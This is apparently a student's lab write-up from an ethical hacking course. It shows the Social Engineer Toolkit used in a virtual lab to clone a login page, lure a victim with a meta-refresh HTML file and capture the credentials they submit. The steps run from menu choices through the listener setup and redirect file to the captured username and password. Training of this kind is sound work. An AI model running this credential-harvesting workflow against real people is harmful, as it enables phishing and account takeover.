Objectives

Many exploits begin with a social engineering attack that is designed to obtain credentials or plant malware to create entry points into the target network. One of the tools used to perform these social engineering attacks is the Social Engineer Toolkit (SET), developed by David Kennedy.

Launching SET and exploring the toolkit
Cloning a website to obtain user credentials
Capturing and viewing user credentials

Background / Scenario
In this activity, you will clone a website and obtain user credentials. This activity is performed under carefully controlled conditions within a virtual environment. SET tools should only be used for penetration testing in situations where you have written permission to perform social engineering exploits.
In an actual penetration test, this procedure could be used to reveal problems with user security training and the need take measures to educate users about various types of phishing attacks.

Resources Used
Kali VM customized for Ethical Hacker course
Internet access

Step 1: Load the SET application.
Start Kali Linux using your username and the password. Open a terminal session from the menu bar at the top of the screen.
SET must be run as root. Use the sudo -i command to obtain persistent root access. At the prompt, enter the command setoolkit to load the SET menu system. The Social Engineering Toolkit can also be run from the Applications >Social Engineering Tools >social engineering toolkit (root) choice on the Kali menu.
┌──(kali㉿Kali)-[~]
└─$ sudo -i
[sudo] password for kali:
┌──(root㉿Kali)-[~]
└─# setoolkit
If this is the first time that you have run SET, the license terms and conditions are displayed, and an agreement is required. Read the terms carefully.

 After reading the disclaimer, enter y to accept the terms of service.


Part 2: Cloning a Website to Obtain User Credentials
In this part of the lab, I created a perfect copy of the login page for a website. The fake login page will gather all credentials submitted to it and then redirect the user to the real website.

From the Social-Engineering Attacks submenu, I chose option 2) Website Attack Vectors to begin the web site cloning exploit.

Examine the Available Social-Engineering Attacks.
At the SET prompt, enter 1 and press Enter to access the Social-Engineering Attacks submenu.
set> 1
Select from the menu:
 
   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

Choose option 2, Website Attack Vectors

Then choose option 3 to enable credential harvesting

Select 3) Credential Harvester Attack Method from the menu

Select 2) Site Cloner from the Credential Harvester Attack Method menu. 

Information describing which IP address is needed to host the fake website and to receive the POST data is displayed. Enter the web attacker IP address at the prompt <Your IP>

set:webattack> IP address for the POST back in Harvester/Tabnabbing [10.0.2.15]:10.6.6.1

Then Next, enter the URL of the website that you want to clone. 


When the website is cloned, the following message appears on the terminal.
The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:
Note: No prompt will be returned to you. This is because a listener is now active on port 80 on the Kali computer and all port 80 traffic will be redirected to this screen. Do not close the terminal window. 


In a “real-life” exploit, at this point, a phishing exploit containing a link or QR code that sends the user to the fake website is created and sent. In this lab, an html document is created to direct the user to the fake webpage. This document simulates a distributed phishing URL. It could be distributed as a file attachment in phishing emails.

So I created a html file, with my listening IP in the metaheader tag
<html>
<head>
<meta http-equiv="refresh" content="0; url=http://10.6.6.1/" />
</head>
</html>


The purpose of the cloned website is to present a web page that looks identical to the one that the user is expecting. 
A good hacker would create a fake URL that would be very similar to the actual URL, so that unless the user inspects the URL very closely, it would go unnoticed, and ofcourse send it in a phishing mail format.

When the victim Double-clicks the link for my html page. The cloned page should appear in a browser window, which is identical to the original page

Enter some information in the Username and Password fields and click Login to send the form.
Username: some.user@gmail.com
Password: Pa55w0rdd!

My listening IP captures the login credentials and  the cloned web page redirected the browser to the real web site. However, the user has real credentials have been provided to my clone clone of the original website.

The victim obviously thinks it was a network glitch, since the original login page now reappears. He/She puts in their credential for the second time and continues browsing.

While on my clone here is what I have:

[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: username=some.user@gmail.com
POSSIBLE PASSWORD FIELD FOUND: password=Pa55w0rdd!
POSSIBLE USERNAME FIELD FOUND: Login=Login
POSSIBLE USERNAME FIELD FOUND: user_token=69c0375a6ee98b96a5b643eed1e97f94
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.

Boom! Got their login credentials.

To save the report in XML format to use in other penetration testing applications, enter CTRL-C. 
The report file name and path are returned. Select the path and filename and right-click to copy the selection. 
The filenames that are created contain the date and time the file was created in this format: 2023-04-07 17:32:55.967169.xml

I can view the xml file outside the SetoolKit IDE, by  going to the saved directory: # cat /root/.set/reports/”2023-04-07 17:32:55.967169.xml”

A hacker can go to the original website, login and change credentials

# Reflection

As an ethical hacker, how can I possibly use this knowledge ?

It could be used with a phishing email. For example, the tester could send emails to various employees asking them to login to a fake URL that looks like the real one. 
The URL links to the very familiar login page that was cloned from the real site. From there, credentials could be harvested for multiple users. 
The results of this test could then be reported to the customer with the mitigation recommendation of additional user training to prevent similar actual attacks.


#Conclusion

Many attacks don’t “hack” systems directly.
They replicate trust.

A fake website can:

Look identical to a real one

Use the same logos, layout, and wording

Ask users to “log in”

Capture whatever credentials the user types

Nothing is broken.
The user voluntarily gives access.

That’s why this attack class is so effective.


Cloning sites or harvesting credentials without explicit authorization is illegal and unethical.

But understanding that it exists is essential to:

Defending organizations

Educating users

Designing safer systems.
